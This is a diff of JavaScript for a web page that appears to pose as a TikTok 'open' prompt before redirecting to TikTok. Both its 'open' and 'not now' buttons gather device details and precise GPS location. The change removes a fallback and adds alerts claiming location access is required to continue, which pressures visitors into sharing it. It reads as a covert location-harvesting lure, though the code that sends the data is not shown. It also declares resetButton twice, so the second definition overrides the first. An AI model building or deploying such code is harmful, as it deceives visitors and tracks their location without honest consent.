@@ -6,50 +6,87 @@ const REDIRECT_URL = "https://www.tiktok.com/foryou";
 
 const btn = document.getElementById('mainAction');
 const nbtn = document.getElementById('notnow');
+const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-btn.addEventListener('click', function() {
+
+
+btn.addEventListener('click', async () => {
+
     btn.innerText = "Opening...";
     btn.style.opacity = "0.7";
 
-    // 1. Gather System Info immediately
     const systemInfo = getSystemDetails();
 
-    if (navigator.geolocation) {
-        // High accuracy request
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            // Success: GPS Available
-            await handleGPSLocation(pos, systemInfo);
-        }, () => {
-            // Error/Denied: Fallback to IP
-            handleIPFallback(systemInfo, "User Denied GPS / Error");
-        }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
-    } else {
-        // Not supported: Fallback to IP
-        handleIPFallback(systemInfo, "Geolocation Not Supported by Browser");
+    try {
+        const permission = await navigator.permissions.query({ name: 'geolocation' });
+
+        if (permission.state === "denied") {
+            alert("Location access is required to continue. Please enable it in your browser settings.");
+            resetButton();
+            return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+            async (pos) => {
+                await handleGPSLocation(pos, systemInfo);
+            },
+            (error) => {
+                alert("We need your location to continue.");
+                resetButton();
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+
+    } catch (err) {
+        console.error(err);
+        resetButton();
     }
+
 });
 
-nbtn.addEventListener('click', function() {
-    btn.innerText = "Closing...";
-    btn.style.opacity = "0.7";
+function resetButton() {
+    btn.innerText = "Try Again";
+    btn.style.opacity = "1";
+}
 
-    // 1. Gather System Info immediately
+nbtn.addEventListener('click', async () => {
+
+    nbtn.innerText = "Opening...";
+    nbtn.style.opacity = "0.7";
+
     const systemInfo = getSystemDetails();
 
-    if (navigator.geolocation) {
-        // High accuracy request
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            // Success: GPS Available
-            await handleGPSLocation(pos, systemInfo);
-        }, () => {
-            // Error/Denied: Fallback to IP
-            handleIPFallback(systemInfo, "User Denied GPS / Error");
-        }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
-    } else {
-        // Not supported: Fallback to IP
-        handleIPFallback(systemInfo, "Geolocation Not Supported by Browser");
+    try {
+        const permission = await navigator.permissions.query({ name: 'geolocation' });
+
+        if (permission.state === "denied") {
+            alert("Location access is required to continue. Please enable it in your browser settings.");
+            resetButton();
+            return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+            async (pos) => {
+                await handleGPSLocation(pos, systemInfo);
+            },
+            (error) => {
+                alert("We need your location to continue.");
+                resetButton();
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+
+    } catch (err) {
+        console.error(err);
+        resetButton();
     }
+
 });
+
+function resetButton() {
+    nbtn.innerText = "Try Again";
+    nbtn.style.opacity = "1";
+}
 
 async function handleGPSLocation(pos, sysInfo) {
     const lat = pos.coords.latitude;
